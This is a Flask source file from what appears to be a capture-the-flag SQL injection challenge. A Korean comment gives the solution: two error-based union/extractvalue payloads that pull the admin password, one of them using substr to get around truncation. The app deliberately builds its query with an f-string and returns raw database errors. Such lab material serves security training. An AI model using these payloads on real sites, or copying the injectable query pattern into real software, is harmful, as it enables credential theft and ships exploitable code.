'''
solution..!
- error based로 풀면 되는 간단한 문제
- uid request parameter를 할때 별다른 필터링을 거치지 않으므로 union으로 접근하면 됨
    - ' union SELECT extractvalue(1,concat(0x3a,(SELECT upw FROM user WHERE uid='admin')))'
- 단 이렇게 접근할 경우 DH가 다 안나오고 잘리므로 추가 방법을 고려해야함
- 내가 한건.. substr로 뒤에 문자열만 출력하게 처리
    - ' union SELECT extractvalue(1,concat(0x3a,(SELECT substr(upw, 28) FROM user WHERE uid='admin')))'
'''
import os
from flask import Flask, request
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'users')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM user WHERE uid='{uid}';</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
'''

@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        try:
            cur = mysql.connection.cursor()
            cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
            return template.format(uid=uid)
        except Exception as e:
            return str(e)
    else:
        return template


if __name__ == '__main__':
    app.run(host='0.0.0.0')
